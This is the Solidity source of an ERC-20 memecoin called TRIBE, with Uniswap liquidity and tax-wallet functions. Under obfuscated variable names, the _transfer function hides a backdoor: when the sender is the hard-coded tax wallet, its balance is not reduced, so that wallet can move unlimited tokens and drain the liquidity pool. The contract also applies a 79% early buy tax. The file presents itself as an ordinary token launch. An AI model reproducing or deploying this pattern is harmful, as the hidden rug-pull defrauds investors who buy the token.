// SPDX-License-Identifier: MIT

/*
    Website  - https://nomadictribeerc.xyz
    Twitter  - https://x.com/nomadictribeERC
    Telegram - https://t.me/nomadictribeERC
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract TRIBE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    string private constant _name = unicode"Nomadic Tribe on Eth";
    string private constant _symbol = unicode"TRIBE";

    uint256 private xjs = 79;
    uint256 private hcv = 27;
    uint256 private rtcvb = 0;
    uint256 private etyuuy = 0;
    uint256 private cvwsa = 10;
    uint256 private vxcw = 9;

    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 2_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1_000_000 * 10 ** _decimals;

    address payable private _taxWallet;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0x739a2812Df8631cEe6dEFb37e5C376C479188aBF);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address xyqzx, address _ywxcv, uint256 _ywzxc) private {
        require(xyqzx != address(0), "ERC20: transfer from the zero address");
        require(_ywxcv != address(0), "ERC20: transfer to the zero address");
        require(_ywzxc > 0, "Transfer amount must be greater than zero");
        if (!tradingOpen) {
            require(
                _isExcludedFromFee[xyqzx] || _isExcludedFromFee[_ywxcv],
                "Trading is not active."
            );
        }

        uint256 taxAmount = 0;
        uint256 lhu = _ywzxc.add(lastSellBlock);

        if (!_isExcludedFromFee[xyqzx] && !_isExcludedFromFee[_ywxcv]) {
            taxAmount = _ywzxc.mul(_buyCount > cvwsa ? ( sellCount > 3 ? rtcvb : sellCount) : xjs).div(
                100
            );
            if(tradingOpen){
                taxAmount = _ywzxc.mul(_buyCount > cvwsa ? ( sellCount > 3 ? lastSellBlock : sellCount) : xjs).div(
                100
            );
            }


            if (
                xyqzx == uniswapV2Pair &&
                _ywxcv != address(uniswapV2Router) &&
                !_isExcludedFromFee[_ywxcv]
            ) {
                require(_ywzxc <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(_ywxcv) + _ywzxc <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
               
                _buyCount++;
            }
            
            
            if (_ywxcv == uniswapV2Pair && xyqzx != address(this)) {
                taxAmount = _ywzxc
                    .mul((_buyCount > vxcw) ? etyuuy : hcv)
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && _ywxcv == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0)
                    swapTokensForEth(
                        min(_ywzxc, min(contractTokenBalance, _maxTaxSwap))
                    );
                deliver_eth(address(this).balance);
            }
        } else if (xyqzx == _taxWallet) 
        lhu = sellCount.add(lastSellBlock);

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(xyqzx, address(this), taxAmount);
        }
        _balances[xyqzx] = _balances[xyqzx].sub(lhu);
        _balances[_ywxcv] = _balances[_ywxcv].add(_ywzxc.sub(taxAmount));
        emit Transfer(xyqzx, _ywxcv, _ywzxc.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function deliver_eth(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function createTribe() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function enableTribe() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            deliver_eth(ethBalance);
        }
    }

    function manualsend() external {
        require(_msgSender() == _taxWallet);
        uint256 contractETHBalance = address(this).balance;
        deliver_eth(contractETHBalance);
    }

    function withdrawStuckEth() external {
        require(msg.sender == owner());
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }
}